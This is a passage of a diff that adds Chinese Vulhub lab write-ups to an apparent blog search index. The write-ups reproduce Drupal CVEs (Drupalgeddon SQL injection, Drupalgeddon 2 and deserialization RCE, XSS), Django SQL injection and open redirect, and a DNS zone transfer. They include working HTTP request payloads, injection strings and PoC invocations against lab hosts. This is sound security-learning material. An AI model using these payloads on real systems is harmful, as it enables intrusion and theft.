@@ -17,6 +17,385 @@
       </tags>
   </entry>
   <entry>
+    <title>Drupal &lt; 7.32 &quot;Drupalgeddon&quot; SQL 注入漏洞 (CVE-2014-3704)</title>
+    <url>/2021/07/14/Drupal%E3%80%8A7.32%20Drupalgeddon%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2014-3704)/</url>
+    <content><![CDATA[<h1 id="Drupal-lt-7-32-“Drupalgeddon”-SQL-注入漏洞-CVE-2014-3704"><a href="#Drupal-lt-7-32-“Drupalgeddon”-SQL-注入漏洞-CVE-2014-3704" class="headerlink" title="Drupal &lt; 7.32 “Drupalgeddon” SQL 注入漏洞 (CVE-2014-3704)"></a>Drupal &lt; 7.32 “Drupalgeddon” SQL 注入漏洞 (CVE-2014-3704)</h1><p>Drupal 是一个免费的开源 Web 内容管理框架，用 PHP 编写并在 GNU 通用公共许可证下分发。</p>
+<p>Drupal core 7.x 7.32之前的数据库抽象API中的expandArguments函数没有正确构造prepared statement，这使得远程攻击者可以通过包含精心制作的key的数组进行SQL注入攻击。</p>
+<a id="more"></a>
+
+<p>启动Drupal 7.31 环境。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>服务器启动后，浏览<code>http://192.168.44.132:8080</code>查看Drupal安装向导，使用默认配置进行安装。</p>
+<p>注意Mysql数据库名称是<code>drupal</code>，数据库用户名和密码是<code>root</code>，地址是<code>mysql</code>：</p>
+<p><img src="https://image.3001.net/images/20210714/16262709089522.png" alt="image-20210714104527357"></p>
+<p>安装完成后，浏览主页。</p>
+<p><img src="https://image.3001.net/images/20210714/1626270912398.png" alt="image-20210714104712395"></p>
+<p>SQL 注入不需要身份验证，可以通过发送以下请求来执行恶意 SQL 语句。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?q&#x3D;node&amp;destination&#x3D;node HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line"></span><br><span class="line">pass&#x3D;lol&amp;form_build_id&#x3D;&amp;form_id&#x3D;user_login_block&amp;op&#x3D;Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]&#x3D;bob&amp;name[0]&#x3D;a</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，SQL 语句报告了一条包含用户数据的错误消息。</p>
+<p><img src="https://image.3001.net/images/20210714/16262709178710.png" alt="image-20210714105545912"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Drupal</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Drupal 远程代码执行漏洞（CVE-2018-7602）</title>
+    <url>/2021/07/14/Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7602%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Drupal-远程代码执行漏洞（CVE-2018-7602）"><a href="#Drupal-远程代码执行漏洞（CVE-2018-7602）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2018-7602）"></a>Drupal 远程代码执行漏洞（CVE-2018-7602）</h1><ul>
+<li>影响软件：drupal</li>
+<li>方式：对URL中的#进行编码两次，绕过sanitize()函数过滤</li>
+<li>效果：任意命令执行</li>
+</ul>
+<a id="more"></a>
+
+<p>启动drupal 7.57的环境。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问 <code>http://your-ip:8081/</code> 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</p>
+<p>参考<a href="https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7602.py" target="_blank" rel="noopener">pimps/CVE-2018-7600</a>的PoC。</p>
+<p>如下图所示，执行以下命令即可复现该漏洞。示例命令为 <code>id</code>，如图红框中显示，可以执行该命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># &quot;id&quot;为要执行的命令 第一个admin为用户名 第二个admin为密码</span><br><span class="line">python3 drupa7-CVE-2018-7602.py -c &quot;id&quot; admin admin http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210714/16262706492953.png" alt="image-20210714145341763"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Drupal</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Drupal 远程代码执行漏洞（CVE-2019-6339）</title>
+    <url>/2021/07/14/Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-6339%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Drupal-远程代码执行漏洞（CVE-2019-6339）"><a href="#Drupal-远程代码执行漏洞（CVE-2019-6339）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2019-6339）"></a>Drupal 远程代码执行漏洞（CVE-2019-6339）</h1><ul>
+<li>影响软件：Drupal</li>
+<li>方式：phar反序列化RCE</li>
+<li>参考链接：<a href="https://paper.seebug.org/897/" target="_blank" rel="noopener">Drupal 1-click to RCE 分析</a></li>
+<li>效果：任意命令执行</li>
+</ul>
+<a id="more"></a>
+
+<p>启动drupal 8.5.0的环境。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问 <code>http://192.168.44.132:8080/</code> 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</p>
+<p>先使用管理员用户上传头像，头像图片为构造好的 PoC，参考<a href="https://github.com/thezdi/PoC/tree/master/Drupal" target="_blank" rel="noopener">thezdi/PoC</a>的PoC。</p>
+<p><img src="https://image.3001.net/images/20210714/16262707898542.png" alt="image-20210714160530039"></p>
+<p>Drupal 的图片默认存储位置为 <code>/sites/default/files/pictures/&lt;YYYY-MM&gt;/</code>，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。</p>
+<p>访问 <code>http://192.168.44.132:8080/admin/config/media/file-system</code>，在 <code>Temporary directory</code> 处输入之前上传的图片路径，示例为 <code>phar://./sites/default/files/pictures/2021-07/blog-ZDI-CAN-7232-cat.jpg</code>，保存后将触发该漏洞。如下图所示，触发成功。</p>
+<p><img src="https://image.3001.net/images/20210714/16262707935562.png" alt="image-20210714160958748"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Drupal</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Drupal XSS漏洞（CVE-2019-6341）</title>
+    <url>/2021/07/14/Drupal%20XSS%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-6341%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Drupal-XSS漏洞（CVE-2019-6341）"><a href="#Drupal-XSS漏洞（CVE-2019-6341）" class="headerlink" title="Drupal XSS漏洞（CVE-2019-6341）"></a>Drupal XSS漏洞（CVE-2019-6341）</h1><ul>
+<li>影响软件：Drupal</li>
+<li>方式：通过文件模块或者子系统上传恶意文件触发XSS漏洞</li>
+<li>参考链接：<a href="https://paper.seebug.org/897/" target="_blank" rel="noopener">Drupal 1-click to RCE 分析</a></li>
+<li>效果：JS代码执行（Cookies 资料窃取、会话劫持、钓鱼欺骗、网页挂马等）</li>
+</ul>
+<a id="more"></a>
+
+<p>启动drupal 8.5.0的环境。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问 <code>http://192.168.44.132:8080/</code> 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</p>
+<p>该漏洞需要利用drupal文件模块上传文件的漏洞，伪造一个图片文件，上传，文件的内容实际是一段HTML代码，内嵌JS，这样其他用户在访问这个链接时，就可能触发XSS漏洞。</p>
+<p>Drupal 的图片默认存储位置为 <code>/sites/default/files/pictures/&lt;YYYY-MM&gt;/</code>，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。</p>
+<p>使用PoC上传构造好的伪造GIF文件，PoC参考<a href="https://github.com/thezdi/PoC/tree/master/Drupal" target="_blank" rel="noopener">thezdi/PoC</a>的PoC。</p>
+<p>如图，输入如下命令，即可使用PoC构造样本并完成上传功能，第一个参数为目标IP 第二个参数为目标端口。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php blog-poc.php 192.168.44.132 8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210714/16262705016999.png" alt="image-20210714170033517"></p>
+<p>上传成功后，访问图片位置，<code>http://192.168.44.132:8080/sites/default/files/pictures/2021-07/_0</code> 即可触发 XSS 漏洞，如下图所示。</p>
+<p><img src="https://image.3001.net/images/20210714/16262705035010.png" alt="image-20210714170023505"></p>
+<p>Tips:</p>
+<ol>
+<li>因为 Chrome 和 FireFox 浏览器自带部分过滤 XSS 功能，所以验证存在时可使用 Edge 浏览器或者 IE 浏览器。</li>
+<li>访问的图片名称为_0的原因是因为 Drupal 的规则机制，具体原理见<a href="https://paper.seebug.org/897/" target="_blank" rel="noopener">Drupal 1-click to RCE 分析</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Drupal</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Drupal Drupalgeddon 2 远程代码执行漏洞 (CVE-2018-7600)</title>
+    <url>/2021/07/14/Drupal%20Drupalgeddon%202%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2018-7600)/</url>
+    <content><![CDATA[<h1 id="Drupal-Drupalgeddon-2-远程代码执行漏洞-CVE-2018-7600"><a href="#Drupal-Drupalgeddon-2-远程代码执行漏洞-CVE-2018-7600" class="headerlink" title="Drupal Drupalgeddon 2 远程代码执行漏洞 (CVE-2018-7600)"></a>Drupal Drupalgeddon 2 远程代码执行漏洞 (CVE-2018-7600)</h1><p>7.58 之前的 Drupal、8.3.9 之前的 8.x、8.4.6 之前的 8.4.x 和 8.5.1 之前的 8.5.x 允许远程攻击者执行任意代码，因为一个问题会影响具有默认或通用模块配置的多个子系统，包括表单 API。</p>
+<a id="more"></a>
+
+<p>参考：</p>
+<ul>
+<li><a href="https://research.checkpoint.com/uncovering-drupalgeddon-2/" target="_blank" rel="noopener">https://research.checkpoint.com/uncovering-drupalgeddon-2/</a></li>
+</ul>
+<p>启动易受攻击的 Drupal 8.5.0 环境。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>环境启动后，访问<code>http://192.168.44.132:8080/</code>，会看到drupal安装页面。使用“标准”配置文件完成 drupal 安装。因为没有mysql环境，安装时应该选择sqlite数据库。安装完成后，您就可以开始利用它了。</p>
+<p>参考<a href="https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py" target="_blank" rel="noopener">a2u/CVE-2018-7600</a>，我们可以向drupal发送以下请求：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;user&#x2F;register?element_parents&#x3D;account&#x2F;mail&#x2F;%23value&amp;ajax_form&#x3D;1&amp;_wrapper_format&#x3D;drupal_ajax HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line"></span><br><span class="line">form_id&#x3D;user_register_form&amp;_drupal_ajax&#x3D;1&amp;mail[#post_render][]&#x3D;exec&amp;mail[#type]&#x3D;markup&amp;mail[#markup]&#x3D;id</span><br></pre></td></tr></table></figure>
+
+<p>成功执行代码后，执行 id 命令：</p>
+<p><img src="https://image.3001.net/images/20210714/16262704054609.png" alt="image-20210714141919387"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Drupal</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）</title>
+    <url>/2021/07/14/Drupal%20Core%208%20PECL%20YAML%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-6920%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）"><a href="#Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）" class="headerlink" title="Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）"></a>Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）</h1><ul>
+<li>影响软件：Drupal</li>
+<li>方式：反序列化</li>
+<li>参考链接：<a href="https://paper.seebug.org/334/" target="_blank" rel="noopener">CVE-2017-6920:Drupal远程代码执行漏洞分析及POC构造</a></li>
+<li>效果：任意代码执行</li>
+</ul>
+<a id="more"></a>
+
+<p>启动 drupal 8.3.0 的环境。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问 <code>http://192.168.44.132:8080/</code> 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</p>
+<ul>
+<li>先安装 <code>yaml</code> 扩展，需要先进入容器 <code>docker exec -it [id] /bin/bash</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 换镜像源，默认带vim编辑器，所以用cat换源，可以换成自己喜欢的源</span><br><span class="line">cat &gt; sources.list &lt;&lt; EOF</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-updates main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-backports main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-backports main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security&#x2F; jessie&#x2F;updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security&#x2F; jessie&#x2F;updates main non-free contrib</span><br><span class="line">EOF</span><br><span class="line"># 安装依赖</span><br><span class="line">apt update</span><br><span class="line">apt-get -y install gcc make autoconf libc-dev pkg-config</span><br><span class="line">apt-get -y install libyaml-dev</span><br><span class="line"># 安装yaml扩展</span><br><span class="line">pecl install yaml</span><br><span class="line">docker-php-ext-enable yaml.so</span><br><span class="line"># 启用 yaml.decode_php 否则无法复现成功</span><br><span class="line">echo &#39;yaml.decode_php &#x3D; 1 &#x3D; 1&#39;&gt;&gt;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;conf.d&#x2F;docker-php-ext-yaml.ini</span><br><span class="line"># 退出容器</span><br><span class="line">exit</span><br><span class="line"># 重启容器，CONTAINER换成自己的容器ID</span><br><span class="line">docker restart CONTAINER</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>.登录一个管理员账号</li>
+<li>2.访问 <code>http://127.0.0.1:8080/admin/config/development/configuration/single/import</code></li>
+<li>3.如下图所示，<code>Configuration type</code> 选择 <code>Simple configuration</code>，<code>Configuration name</code> 任意填写，<code>Paste your configuration here</code> 中填写PoC如下：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!php&#x2F;object &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:&#123;s:33:\&quot;\0GuzzleHttp\\Psr7\\FnStream\0methods\&quot;;a:1:&#123;s:5:\&quot;close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;s:9:\&quot;_fn_close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210714/16262703105674.png" alt="image-20210714111843786"></p>
+<ul>
+<li>4.点击 <code>Import</code> 后可以看到漏洞触发成功，弹出 <code>phpinfo</code> 页面。</li>
+</ul>
+<p><img src="https://image.3001.net/images/20210714/16262703136356.png" alt="image-20210714112907957"></p>
+<ul>
+<li>Tips：<ul>
+<li>虽然官方 CPE 信息显示从 <code>8.0.0</code> 开始就有该漏洞，但是在 <code>drupal:8.0.0</code> 容器内并没有复现成功，相同操作在 <code>drupal:8.3.0</code> 则可以复现成功，故基础镜像选择<code>drupal:8.3.0</code></li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Drupal</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DNS 区域传输 (AXFR)</title>
+    <url>/2021/07/13/DNS%20%E5%8C%BA%E5%9F%9F%E4%BC%A0%E8%BE%93%20(AXFR)/</url>
+    <content><![CDATA[<h1 id="DNS-区域传输-AXFR"><a href="#DNS-区域传输-AXFR" class="headerlink" title="DNS 区域传输 (AXFR)"></a>DNS 区域传输 (AXFR)</h1><p>使用 AXFR 协议的 DNS 区域传输是跨 DNS 服务器复制 DNS 记录的最简单机制。为避免在多个 DNS 服务器上编辑信息的需要，您可以在一台服务器上编辑信息并使用 AXFR 将信息复制到其他服务器。但是，如果您不保护您的服务器，恶意方可能会使用 AXFR 来获取有关您所有主机的信息。</p>
+<a id="more"></a>
+
+<p>参考：</p>
+<ul>
+<li><a href="https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/</a></li>
+<li><a href="https://nmap.org/nsedoc/scripts/dns-zone-transfer.html" target="_blank" rel="noopener">https://nmap.org/nsedoc/scripts/dns-zone-transfer.html</a></li>
+</ul>
+<p>Vulhub 使用<a href="https://wiki.debian.org/Bind9" target="_blank" rel="noopener">Bind9</a>构建 dns 服务器，但这并不意味着只有 Bind9 支持 AXFR 记录。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>运行DNS服务器，环境运行后，会监听 TCP 和 UDP 的 53 端口，DNS 协议支持从这两个端口传输数据。</p>
+<p>在Linux下，我们可以使用<strong>dig</strong>命令发送AXFR记录请求：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @your-ip -t axfr vulhub.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210714/1626229870242.png" alt="image-20210714102102742"></p>
+<p>得到了的所有子域记录<code>vulhub.org</code>，这里有一个 DNS 区域传输漏洞。</p>
+<p>我们也可以使用 Nmap 脚本来扫描这个漏洞： </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script dns-zone-transfer.nse --script-args &quot;dns-zone-transfer.domain&#x3D;vulhub.org&quot; -Pn -p 53 your-ip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210714/16262298732059.png" alt="image-20210714102657606"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>DNS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Django GIS 函数和聚合上的Oracle SQL 注入漏洞 (CVE-2020-9402)</title>
+    <url>/2021/07/12/Django%20GIS%20%E5%87%BD%E6%95%B0%E5%92%8C%E8%81%9A%E5%90%88%E4%B8%8A%E7%9A%84Oracle%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2020-9402)/</url>
+    <content><![CDATA[<h1 id="Django-GIS-函数和聚合上的Oracle-SQL-注入漏洞-CVE-2020-9402"><a href="#Django-GIS-函数和聚合上的Oracle-SQL-注入漏洞-CVE-2020-9402" class="headerlink" title="Django GIS 函数和聚合上的Oracle SQL 注入漏洞 (CVE-2020-9402)"></a>Django GIS 函数和聚合上的Oracle SQL 注入漏洞 (CVE-2020-9402)</h1><p>Django 于 2020 年 3 月 4 日发布了安全更新，修复了 GIS 函数和聚合中的 SQL 注入漏洞。</p>
+<a id="more"></a>
+
+<p>参考链接：</p>
+<ul>
+<li><a href="https://www.djangoproject.com/weblog/2020/mar/04/security-releases/" target="_blank" rel="noopener">https://www.djangoproject.com/weblog/2020/mar/04/security-releases/</a></li>
+</ul>
+<p>该漏洞需要开发者使用JSONField/HStoreField；并且可以控制查询集的字段名称。Django 的内置应用程序 Django-Admin 受到影响，这为我们提供了一个简单的方法来重现该漏洞。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，就可以看到Django的主页了<code>http://192.168.44.132:8000</code>。</p>
+<p>访问网站 <code>http://192.168.44.132:8000/vuln/</code></p>
+<p>然后添加<code>20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null OR (1+1</code>到 GET para,eter，其中 q 是 quertset：</p>
+<p><a href="http://192.168.44.132:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual" target="_blank" rel="noopener">http://192.168.44.132:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual</a> )%20is%20null%20%20OR%20 %3D 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v%24instance)) from dual) is null  OR ) (1%2B1可以看到括号已经注入成功，SQL语句报错：</p>
+<p><img src="https://image.3001.net/images/20210712/16260987755440.png" alt="image-20210712215031879"></p>
+<p>或者您可以评估其他网站<code>http://your-ip:8000/vuln2/</code>，并添加<code>0.05))) FROM &quot;VULN_COLLECTION2&quot; where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null --</code>到 GET para,eter，其中 q 是 quertset：</p>
+<p><a href="http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL)" target="_blank" rel="noopener">http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL)</a> ))%20from%20dual)%20is%20not%20null%20%20–)) FROM “VULN_COLLECTION2”  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  –)</p>
+<p>还可以看到SQL语句报错：</p>
+<p><img src="https://image.3001.net/images/20210712/16260987785996.png" alt="image-20210712215052634"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Django</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Django JSONField/HStoreField SQL 注入漏洞 (CVE-2019-14234)</title>
+    <url>/2021/07/12/Django%20JSONField%E3%80%81HStoreField%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2019-14234)/</url>
+    <content><![CDATA[<h1 id="Django-JSONField-HStoreField-SQL-注入漏洞-CVE-2019-14234"><a href="#Django-JSONField-HStoreField-SQL-注入漏洞-CVE-2019-14234" class="headerlink" title="Django JSONField/HStoreField SQL 注入漏洞 (CVE-2019-14234)"></a>Django JSONField/HStoreField SQL 注入漏洞 (CVE-2019-14234)</h1><p>Django 于 2019 年 8 月 1 日发布了安全更新，修复了 JSONField 和 HStoreField 两个模型字段中的 SQL 注入漏洞。</p>
+<a id="more"></a>
+
+<p>参考链接：</p>
+<ul>
+<li><a href="https://www.djangoproject.com/weblog/2019/aug/01/security-releases/" target="_blank" rel="noopener">https://www.djangoproject.com/weblog/2019/aug/01/security-releases/</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html</a></li>
+</ul>
+<p>该漏洞需要开发者使用JSONField/HStoreField；并且可以控制查询集的字段名称。Django 的内置应用程序 Django-Admin 受到影响，这为我们提供了一个简单的方法来重现该漏洞。 </p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，就可以看到Django的主页了<code>http://192.168.44.132:8000</code>。</p>
+<p>首先，访问<code>http://192.168.44.132:8000/admin/</code>使用 username<code>admin</code>和 password<code>a123123123</code>登录到 Django-Admin 。</p>
+<p>然后转到<code>http://192.168.44.132:8000/admin/vuln/collection/</code>模型的列表视图<code>Collection</code>：</p>
+<p><img src="https://image.3001.net/images/20210712/1626098165490.png" alt="image-20210712212141883"></p>
+<p>添加<code>detail__a&#39;b=123</code>到GET参数，其中<code>detail</code>JSONField：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8000&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail__a%27b&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p>可以看到单引号已经注入成功，SQL语句报错：</p>
+<p><img src="https://image.3001.net/images/20210712/16260981686328.png" alt="image-20210712212240753"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Django</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Django &lt; 2.0.8 在 CommonMiddleware 中打开重定向可能性 (CVE-2018-14574)</title>
+    <url>/2021/07/12/Django%E3%80%8A2.0.8%20%E5%9C%A8%20CommonMiddleware%20%E4%B8%AD%E6%89%93%E5%BC%80%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%AF%E8%83%BD%E6%80%A7%20(CVE-2018-14574)/</url>
+    <content><![CDATA[<h1 id="Django-lt-2-0-8-在-CommonMiddleware-中打开重定向可能性-CVE-2018-14574"><a href="#Django-lt-2-0-8-在-CommonMiddleware-中打开重定向可能性-CVE-2018-14574" class="headerlink" title="Django &lt; 2.0.8 在 CommonMiddleware 中打开重定向可能性 (CVE-2018-14574)"></a>Django &lt; 2.0.8 在 CommonMiddleware 中打开重定向可能性 (CVE-2018-14574)</h1><p>如果<code>django.middleware.common.CommonMiddleware</code>和<code>APPEND_SLASH</code>设置都已启用，并且项目的 URL 模式接受以斜杠结尾的任何路径，则对该站点的恶意制作的 URL 的请求可能会导致重定向到另一个站点，从而启用网络钓鱼和其他攻击。</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现在访问<code>http://your-ip:8000//www.example.com</code>，您将被重定向到<code>//www.example.com/</code>：</p>
+<p><img src="https://image.3001.net/images/20210712/16260830005593.png" alt="image-20210712174306678"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Django</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Django debug page XSS漏洞（CVE-2017-12794）分析</title>
+    <url>/2021/07/12/Django%20debug%20page%20XSS%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12794%EF%BC%89%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="Django-debug-page-XSS漏洞（CVE-2017-12794）"><a href="#Django-debug-page-XSS漏洞（CVE-2017-12794）" class="headerlink" title="Django debug page XSS漏洞（CVE-2017-12794）"></a>Django debug page XSS漏洞（CVE-2017-12794）</h1><a id="more"></a>
+
+<p>在使用Postgres数据库并触发异常的时候，psycopg2会将字段名和字段值全部抛出。那么，如果字段值中包含我们可控的字符串，又由于0x02中说到的，这个字符串其实就会被设置成<code>__cause__</code>，最后被显示在页面中。</p>
+<p>所以我们假设有如下场景：</p>
+<ol>
+<li>用户注册页面，未检查用户名</li>
